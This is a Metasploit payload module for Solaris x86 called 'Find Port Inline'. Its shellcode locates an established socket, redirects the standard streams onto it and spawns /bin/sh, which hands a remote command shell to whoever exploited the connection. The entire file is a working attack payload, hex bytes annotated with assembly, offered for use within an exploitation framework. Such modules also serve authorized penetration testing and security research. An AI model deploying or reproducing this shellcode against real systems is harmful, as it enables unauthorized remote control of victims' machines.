##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 86

  include Msf::Payload::Single
  include Msf::Payload::Solaris
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Solaris Command Shell, Find Port Inline',
      'Description'   => 'Spawn a shell on an established connection',
      'Author'        => 'Ramon de C Valle',
      'License'       => MSF_LICENSE,
      'Platform'      => 'solaris',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::FindPort,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'CPORT' => [ 43, 'n' ],
            },
          'Payload' =>
            "\x31\xdb"             + #   xorl    %ebx,%ebx                  #
            "\xf7\xe3"             + #   mull    %ebx                       #
            "\x53"                 + #   pushl   %ebx                       #
            "\x89\xe7"             + #   movl    %esp,%edi                  #
            "\x68\xff\xd8\xff\x3c" + #   pushl   $0x3cffd8ff                #
            "\x6a\x65"             + #   pushl   $0x65                      #
            "\x89\xe6"             + #   movl    %esp,%esi                  #
            "\xf7\x56\x04"         + #   notl    0x04(%esi)                 #
            "\xf6\x16"             + #   notb    (%esi)                     #
            "\x57"                 + #   pushl   %edi                       #
            "\xb3\x91"             + #   movb    $0x91,%bl                  #
            "\x53"                 + #   pushl   %ebx                       #
            "\x53"                 + #   pushl   %ebx                       #
            "\x54"                 + #   pushl   %esp                       #
            "\xb7\x54"             + #   movb    $0x54,%bh                  #
            "\x53"                 + #   pushl   %ebx                       #
            "\x50"                 + #   pushl   %eax                       #
            "\x58"                 + #   popl    %eax                       #
            "\x40"                 + #   incl    %eax                       #
            "\x50"                 + #   pushl   %eax                       #
            "\x6a\x36"             + #   pushl   $0x36                      #
            "\x58"                 + #   popl    %eax                       #
            "\xff\xd6"             + #   call    *%esi                      #
            "\x66\x81\x7f\x02\x04\xd2"+ #   cmpw    $0xd204,0x02(%edi)         #
            "\x75\xf0"             + #   jne     <fndsockcode+31>           #
            "\x58"                 + #   popl    %eax                       #
            "\x50"                 + #   pushl   %eax                       #
            "\x6a\x09"             + #   pushl   $0x09                      #
            "\x50"                 + #   pushl   %eax                       #
            "\x6a\x3e"             + #   pushl   $0x3e                      #
            "\x58"                 + #   popl    %eax                       #
            "\xff\xd6"             + #   call    *%esi                      #
            "\xff\x4f\xe0"         + #   decl    -0x20(%edi)                #
            "\x79\xf6"             + #   jns     <fndsockcode+52>           #
            "\x50"                 + #   pushl   %eax                       #
            "\x68\x2f\x2f\x73\x68" + #   pushl   $0x68732f2f                #
            "\x68\x2f\x62\x69\x6e" + #   pushl   $0x6e69622f                #
            "\x89\xe3"             + #   movl    %esp,%ebx                  #
            "\x50"                 + #   pushl   %eax                       #
            "\x53"                 + #   pushl   %ebx                       #
            "\x89\xe1"             + #   movl    %esp,%ecx                  #
            "\x50"                 + #   pushl   %eax                       #
            "\x51"                 + #   pushl   %ecx                       #
            "\x53"                 + #   pushl   %ebx                       #
            "\xb0\x3b"             + #   movb    $0x3b,%al                  #
            "\xff\xd6"               #   call    *%esi                      #
        }
      ))
  end
end
